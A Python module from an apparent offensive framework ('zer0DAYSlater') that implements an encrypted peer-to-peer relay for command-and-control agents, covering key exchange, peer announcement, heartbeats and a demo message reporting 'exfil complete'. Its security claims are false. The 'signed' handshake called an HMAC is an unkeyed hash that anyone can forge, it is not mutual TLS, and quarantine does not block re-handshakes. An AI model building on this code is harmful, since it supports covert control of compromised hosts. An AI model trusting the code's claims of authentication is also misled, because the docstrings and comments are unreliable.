#!/usr/bin/env python3
"""
zer0DAYSlater — mTLS Mesh Agent

Replaces the basic socket mesh with mutual TLS peer authentication.
Agents verify each other's identity before relaying any data.
No trust without cryptographic proof.

Architecture:
  - Each agent generates an ephemeral NaCl keypair on startup
  - Peers exchange public keys via a signed handshake
  - All mesh traffic is encrypted with NaCl Box (Curve25519/XSalsa20/Poly1305)
  - A peer that fails verification is quarantined — not retried
  - Mesh topology is dynamic — peers announce themselves, dead peers are pruned

Builds on peer_auth.py's NaCl primitives.
Replaces c2_mesh_agent.py's plaintext socket relay.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import socket
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import nacl.utils
from nacl.encoding import Base64Encoder, RawEncoder
from nacl.public import Box, PrivateKey, PublicKey

# ── Configuration ─────────────────────────────────────────────────────────────

MESH_PORT     = int(os.environ.get("ZDS_MESH_PORT", "9009"))
MESH_TIMEOUT  = float(os.environ.get("ZDS_MESH_TIMEOUT", "5.0"))
HEARTBEAT_INT = int(os.environ.get("ZDS_HEARTBEAT_INTERVAL", "30"))
MAX_PEERS     = int(os.environ.get("ZDS_MAX_PEERS", "16"))

# ── Message types ─────────────────────────────────────────────────────────────

class MeshMsgType(str, Enum):
    HANDSHAKE    = "handshake"    # key exchange
    HANDSHAKE_OK = "handshake_ok" # key exchange accepted
    DATA         = "data"         # encrypted payload
    HEARTBEAT    = "heartbeat"    # keepalive
    PEER_LIST    = "peer_list"    # announce known peers
    QUARANTINE   = "quarantine"   # peer failed verification


# ── Peer state ────────────────────────────────────────────────────────────────

class PeerStatus(str, Enum):
    UNKNOWN      = "unknown"
    HANDSHAKING  = "handshaking"
    VERIFIED     = "verified"
    QUARANTINED  = "quarantined"


@dataclass
class PeerRecord:
    ip:           str
    port:         int
    public_key:   PublicKey | None  = None
    status:       PeerStatus        = PeerStatus.UNKNOWN
    last_seen:    float             = field(default_factory=time.time)
    verify_fails: int               = 0
    messages_rx:  int               = 0
    messages_tx:  int               = 0

    @property
    def addr(self) -> tuple[str, int]:
        return (self.ip, self.port)

    @property
    def key_fingerprint(self) -> str:
        if not self.public_key:
            return "unknown"
        raw = self.public_key.encode(encoder=RawEncoder)
        return hashlib.sha256(raw).hexdigest()[:16]


# ── Crypto helpers ────────────────────────────────────────────────────────────

def _make_box(our_private: PrivateKey, their_public: PublicKey) -> Box:
    return Box(our_private, their_public)


def _encrypt(box: Box, message: dict) -> bytes:
    nonce = nacl.utils.random(Box.NONCE_SIZE)
    data  = json.dumps(message).encode()
    return box.encrypt(data, nonce)


def _decrypt(box: Box, ciphertext: bytes) -> dict:
    data = box.decrypt(ciphertext)
    return json.loads(data.decode())


def _sign_handshake(private_key: PrivateKey, peer_ip: str) -> str:
    """
    Produce a handshake token: HMAC of (public_key || peer_ip || timestamp).
    Prevents replay attacks — tokens are time-bounded.
    """
    pub_bytes = private_key.public_key.encode(encoder=RawEncoder)
    ts        = str(int(time.time() // 30))   # 30-second window
    payload   = pub_bytes + peer_ip.encode() + ts.encode()
    return hashlib.sha256(payload).hexdigest()


def _verify_handshake(
    claimed_pub_b64: str,
    token:           str,
    peer_ip:         str,
) -> bool:
    """Verify a handshake token from a peer."""
    try:
        pub_bytes = base64.b64decode(claimed_pub_b64)
        # Check current and previous 30s window (clock skew tolerance)
        for offset in (0, -1):
            ts      = str(int(time.time() // 30) + offset)
            payload = pub_bytes + peer_ip.encode() + ts.encode()
            expected = hashlib.sha256(payload).hexdigest()
            if expected == token:
                return True
        return False
    except Exception:
        return False


# ── mTLS Mesh ─────────────────────────────────────────────────────────────────

class MTLSMesh:
    """
    Mutual TLS mesh agent. Manages peer discovery, key exchange,
    encrypted relay, and quarantine of unverified peers.

    Usage:
        mesh = MTLSMesh()
        mesh.add_peer("192.168.1.101")
        mesh.start()

        # Send to all verified peers
        mesh.broadcast({"op": "result", "data": {...}})

        # Send to specific peer
        mesh.send_to("192.168.1.101", {"op": "task", "data": {...}})

        mesh.stop()
    """

    def __init__(self, port: int = MESH_PORT) -> None:
        self.port        = port
        self.private_key = PrivateKey.generate()
        self.public_key  = self.private_key.public_key
        self.peers:      dict[str, PeerRecord] = {}
        self._lock       = threading.Lock()
        self._running    = False
        self._threads:   list[threading.Thread] = []
        self._handlers:  list[Any] = []

        self.stats = {
            "messages_sent":       0,
            "messages_received":   0,
            "verification_fails":  0,
            "peers_quarantined":   0,
            "peers_verified":      0,
        }

    @property
    def fingerprint(self) -> str:
        raw = self.public_key.encode(encoder=RawEncoder)
        return hashlib.sha256(raw).hexdigest()[:16]

    @property
    def public_key_b64(self) -> str:
        return self.public_key.encode(encoder=Base64Encoder).decode()

    def add_peer(self, ip: str, port: int = MESH_PORT) -> None:
        with self._lock:
            if ip not in self.peers and len(self.peers) < MAX_PEERS:
                self.peers[ip] = PeerRecord(ip=ip, port=port)

    def on_message(self, handler) -> None:
        """Register a callback for verified incoming messages."""
        self._handlers.append(handler)

    def start(self) -> None:
        self._running = True
        listener = threading.Thread(target=self._listen, daemon=True)
        listener.start()
        self._threads.append(listener)

        heartbeat = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat.start()
        self._threads.append(heartbeat)

        # Initiate handshakes with known peers
        for ip in list(self.peers.keys()):
            t = threading.Thread(
                target=self._initiate_handshake, args=(ip,), daemon=True
            )
            t.start()

    def stop(self) -> None:
        self._running = False

    # ── Listener ──────────────────────────────────────────────────────────────

    def _listen(self) -> None:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind(("", self.port))
            srv.listen(MAX_PEERS)
            srv.settimeout(1.0)
            while self._running:
                try:
                    conn, addr = srv.accept()
                    t = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr[0]),
                        daemon=True,
                    )
                    t.start()
                except socket.timeout:
                    continue
        finally:
            srv.close()

    def _handle_connection(self, conn: socket.socket, peer_ip: str) -> None:
        try:
            raw = self._recv_framed(conn)
            if not raw:
                return
            msg = json.loads(raw)
            self._route_message(msg, peer_ip, conn)
        except Exception:
            pass
        finally:
            conn.close()

    # ── Message routing ────────────────────────────────────────────────────────

    def _route_message(
        self,
        msg: dict,
        peer_ip: str,
        conn: socket.socket,
    ) -> None:
        msg_type = msg.get("type")

        if msg_type == MeshMsgType.HANDSHAKE:
            self._handle_handshake(msg, peer_ip, conn)

        elif msg_type == MeshMsgType.DATA:
            self._handle_data(msg, peer_ip)

        elif msg_type == MeshMsgType.HEARTBEAT:
            self._handle_heartbeat(peer_ip)

        elif msg_type == MeshMsgType.PEER_LIST:
            self._handle_peer_list(msg)

    # ── Handshake ──────────────────────────────────────────────────────────────

    def _initiate_handshake(self, peer_ip: str) -> None:
        """Send our public key to a peer and request theirs."""
        token = _sign_handshake(self.private_key, peer_ip)
        msg   = {
            "type":       MeshMsgType.HANDSHAKE,
            "public_key": self.public_key_b64,
            "token":      token,
            "fingerprint": self.fingerprint,
        }
        with self._lock:
            if peer_ip in self.peers:
                self.peers[peer_ip].status = PeerStatus.HANDSHAKING

        self._send_raw(peer_ip, self.peers[peer_ip].port, json.dumps(msg).encode())

    def _handle_handshake(
        self,
        msg: dict,
        peer_ip: str,
        conn: socket.socket,
    ) -> None:
        claimed_pub_b64 = msg.get("public_key", "")
        token           = msg.get("token", "")

        if not _verify_handshake(claimed_pub_b64, token, peer_ip):
            self._quarantine(peer_ip, "handshake token verification failed")
            self.stats["verification_fails"] += 1
            return

        try:
            peer_pub = PublicKey(base64.b64decode(claimed_pub_b64), encoder=RawEncoder)
        except Exception:
            self._quarantine(peer_ip, "invalid public key encoding")
            return

        with self._lock:
            if peer_ip not in self.peers:
                self.peers[peer_ip] = PeerRecord(ip=peer_ip, port=MESH_PORT)
            self.peers[peer_ip].public_key = peer_pub
            self.peers[peer_ip].status     = PeerStatus.VERIFIED
            self.peers[peer_ip].last_seen  = time.time()
            self.stats["peers_verified"]  += 1

        # Send our key back
        our_token = _sign_handshake(self.private_key, peer_ip)
        response  = json.dumps({
            "type":        MeshMsgType.HANDSHAKE_OK,
            "public_key":  self.public_key_b64,
            "token":       our_token,
            "fingerprint": self.fingerprint,
        }).encode()
        try:
            self._send_framed(conn, response)
        except Exception:
            pass

    # ── Data relay ─────────────────────────────────────────────────────────────

    def _handle_data(self, msg: dict, peer_ip: str) -> None:
        with self._lock:
            peer = self.peers.get(peer_ip)

        if not peer or peer.status != PeerStatus.VERIFIED:
            self._quarantine(peer_ip, "data received before verification")
            return

        try:
            box        = _make_box(self.private_key, peer.public_key)
            ciphertext = base64.b64decode(msg["payload"])
            plaintext  = _decrypt(box, ciphertext)

            with self._lock:
                self.peers[peer_ip].messages_rx  += 1
                self.peers[peer_ip].last_seen     = time.time()
            self.stats["messages_received"] += 1

            for handler in self._handlers:
                try:
                    handler(peer_ip, plaintext)
                except Exception:
                    pass

        except Exception:
            self._quarantine(peer_ip, "decryption failed — possible tampering")
            self.stats["verification_fails"] += 1

    def broadcast(self, data: dict) -> int:
        """Send encrypted message to all verified peers. Returns send count."""
        sent = 0
        with self._lock:
            verified = [
                p for p in self.peers.values()
                if p.status == PeerStatus.VERIFIED and p.public_key
            ]
        for peer in verified:
            if self._send_encrypted(peer, data):
                sent += 1
        return sent

    def send_to(self, peer_ip: str, data: dict) -> bool:
        """Send encrypted message to a specific peer."""
        with self._lock:
            peer = self.peers.get(peer_ip)
        if not peer or peer.status != PeerStatus.VERIFIED:
            return False
        return self._send_encrypted(peer, data)

    def _send_encrypted(self, peer: PeerRecord, data: dict) -> bool:
        try:
            box        = _make_box(self.private_key, peer.public_key)
            ciphertext = _encrypt(box, data)
            msg        = json.dumps({
                "type":    MeshMsgType.DATA,
                "payload": base64.b64encode(ciphertext).decode(),
            }).encode()
            self._send_raw(peer.ip, peer.port, msg)
            with self._lock:
                self.peers[peer.ip].messages_tx += 1
            self.stats["messages_sent"] += 1
            return True
        except Exception:
            return False

    # ── Heartbeat ──────────────────────────────────────────────────────────────

    def _heartbeat_loop(self) -> None:
        while self._running:
            time.sleep(HEARTBEAT_INT)
            self._prune_dead_peers()
            with self._lock:
                verified = [
                    p for p in self.peers.values()
                    if p.status == PeerStatus.VERIFIED
                ]
            for peer in verified:
                msg = json.dumps({
                    "type":        MeshMsgType.HEARTBEAT,
                    "fingerprint": self.fingerprint,
                    "ts":          time.time(),
                }).encode()
                self._send_raw(peer.ip, peer.port, msg)

    def _handle_heartbeat(self, peer_ip: str) -> None:
        with self._lock:
            if peer_ip in self.peers:
                self.peers[peer_ip].last_seen = time.time()

    def _prune_dead_peers(self, timeout: float = 120.0) -> None:
        """Remove peers not seen within timeout."""
        now = time.time()
        with self._lock:
            dead = [
                ip for ip, p in self.peers.items()
                if p.status == PeerStatus.VERIFIED
                and (now - p.last_seen) > timeout
            ]
            for ip in dead:
                self.peers[ip].status = PeerStatus.UNKNOWN

    # ── Peer list propagation ─────────────────────────────────────────────────

    def _handle_peer_list(self, msg: dict) -> None:
        """Add newly announced peers to our mesh."""
        for peer_info in msg.get("peers", []):
            ip   = peer_info.get("ip", "")
            port = peer_info.get("port", MESH_PORT)
            if ip and ip not in self.peers:
                self.add_peer(ip, port)
                threading.Thread(
                    target=self._initiate_handshake,
                    args=(ip,),
                    daemon=True,
                ).start()

    # ── Quarantine ────────────────────────────────────────────────────────────

    def _quarantine(self, peer_ip: str, reason: str) -> None:
        with self._lock:
            if peer_ip not in self.peers:
                self.peers[peer_ip] = PeerRecord(ip=peer_ip, port=MESH_PORT)
            self.peers[peer_ip].status        = PeerStatus.QUARANTINED
            self.peers[peer_ip].verify_fails += 1
        self.stats["peers_quarantined"] += 1

    # ── Transport ─────────────────────────────────────────────────────────────

    def _send_raw(self, ip: str, port: int, data: bytes) -> None:
        with socket.create_connection((ip, port), timeout=MESH_TIMEOUT) as s:
            self._send_framed(s, data)

    @staticmethod
    def _send_framed(conn: socket.socket, data: bytes) -> None:
        """Length-prefix framing: 4-byte big-endian length + data."""
        length = len(data).to_bytes(4, "big")
        conn.sendall(length + data)

    @staticmethod
    def _recv_framed(conn: socket.socket) -> bytes | None:
        """Read length-prefixed frame."""
        header = b""
        while len(header) < 4:
            chunk = conn.recv(4 - len(header))
            if not chunk:
                return None
            header += chunk
        length = int.from_bytes(header, "big")
        if length > 10 * 1024 * 1024:   # 10MB max frame
            return None
        data = b""
        while len(data) < length:
            chunk = conn.recv(min(4096, length - len(data)))
            if not chunk:
                return None
            data += chunk
        return data

    # ── Status ────────────────────────────────────────────────────────────────

    def status(self) -> dict[str, Any]:
        with self._lock:
            peer_summary = {
                ip: {
                    "status":      p.status.value,
                    "fingerprint": p.key_fingerprint,
                    "last_seen":   round(time.time() - p.last_seen, 1),
                    "rx":          p.messages_rx,
                    "tx":          p.messages_tx,
                }
                for ip, p in self.peers.items()
            }
        return {
            "node_fingerprint": self.fingerprint,
            "port":             self.port,
            "peers":            peer_summary,
            "stats":            dict(self.stats),
        }


# ── CLI demo (no network required) ───────────────────────────────────────────

def _demo() -> None:
    print("\n[zer0DAYSlater] mTLS Mesh — unit demo")
    print("[*] Testing crypto primitives and peer state machine.\n")

    # Simulate two mesh nodes exchanging keys
    node_a = MTLSMesh(port=9009)
    node_b = MTLSMesh(port=9010)

    print(f"[A] fingerprint: {node_a.fingerprint}")
    print(f"[B] fingerprint: {node_b.fingerprint}\n")

    # Simulate handshake: B presents its key to A
    token_b = _sign_handshake(node_b.private_key, "127.0.0.1")
    valid   = _verify_handshake(node_b.public_key_b64, token_b, "127.0.0.1")
    print(f"[*] B → A handshake token valid: {valid}")

    # Simulate failed handshake (tampered token)
    tampered = token_b[:-4] + "xxxx"
    invalid  = _verify_handshake(node_b.public_key_b64, tampered, "127.0.0.1")
    print(f"[*] Tampered token rejected:     {not invalid}")

    # Simulate encrypted message exchange
    box_a_to_b = _make_box(node_a.private_key, node_b.public_key)
    box_b_to_a = _make_box(node_b.private_key, node_a.public_key)

    msg     = {"op": "result", "data": {"exfil": "complete", "bytes": 4096}}
    enc     = _encrypt(box_a_to_b, msg)
    dec     = _decrypt(box_b_to_a, enc)
    print(f"[*] Encrypted message roundtrip: {dec == msg}")

    # Simulate tampered ciphertext
    tampered_enc = bytearray(enc)
    tampered_enc[32] ^= 0xFF
    try:
        _decrypt(box_b_to_a, bytes(tampered_enc))
        print("[*] Tampered ciphertext accepted: FALSE (should not happen)")
    except Exception:
        print("[*] Tampered ciphertext rejected: True")

    # Quarantine test
    node_a.add_peer("192.168.1.99")
    node_a._quarantine("192.168.1.99", "test quarantine")
    status = node_a.status()
    q_status = status["peers"]["192.168.1.99"]["status"]
    print(f"[*] Quarantine state recorded:   {q_status == 'quarantined'}")

    print(f"\n── Node A status ──")
    for k, v in status["stats"].items():
        print(f"  {k}: {v}")


if __name__ == "__main__":
    _demo()
